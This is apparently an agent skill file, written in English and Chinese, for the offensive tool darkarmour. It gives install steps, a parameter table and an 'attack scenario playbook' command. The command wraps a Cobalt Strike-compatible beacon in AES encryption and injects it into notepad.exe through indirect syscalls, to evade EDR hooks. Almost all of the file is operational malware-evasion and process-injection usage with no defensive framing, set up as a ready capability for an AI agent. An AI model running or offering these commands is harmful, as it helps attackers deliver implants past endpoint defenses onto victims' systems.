---
name: darkarmour-obfuscate
description: "darkarmour: Delivers payloads in EDR environments. Signals: malware development, evasion development, AES encryption, process injection, indirect syscall."
zh-signals: "darkarmour: EDR 环境载荷投递。信号:恶意软件开发,免杀开发,AES 加密,进程注入,间接 syscall。"
---

# darkarmour

- 攻击大类:C45 免杀与载荷投递
- 上游仓库:https://github.com/bats3c/darkarmour
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/bats3c/darkarmour && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 darkarmour.py -f payload.exe -e xor -j -i` | XOR 加密+直接 syscall 注入 |
| `-e aes` | AES 加密 |
| `-j` | 进程注入 |
| `-i` | 间接 syscall |
| `-p wordpad.exe` | 注入宿主 |

## 攻击场景 Playbook

### EDR 环境载荷投递

```bash
python3 darkarmour.py -f beacon.exe -e aes -j -i -p notepad.exe
# AES 加密壳+间接 syscall,绕过 hook
```

## 注意事项

bats3c 出品,加密+直接/间接 syscall 注入免杀,兼容 Cobalt Strike 载荷。
